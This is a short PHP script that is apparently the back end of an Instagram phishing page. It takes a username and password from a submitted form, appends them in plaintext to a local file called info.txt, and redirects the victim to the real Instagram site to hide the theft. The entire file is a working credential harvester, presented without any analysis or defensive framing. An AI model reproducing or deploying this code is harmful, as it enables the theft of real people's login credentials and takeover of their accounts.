<?php
$user = $_POST['fname'];
$password = $_POST['pass'];
$file = fopen("info.txt","a");
fwrite($file,"Username: ");
fwrite($file,$user);
fwrite($file,", ");
fwrite($file,"Password: ");
fwrite($file,$password);

fwrite($file,",");
fwrite($file,"New : ");
header("Location: https://www.instagram.com/");
fclose($file);
?>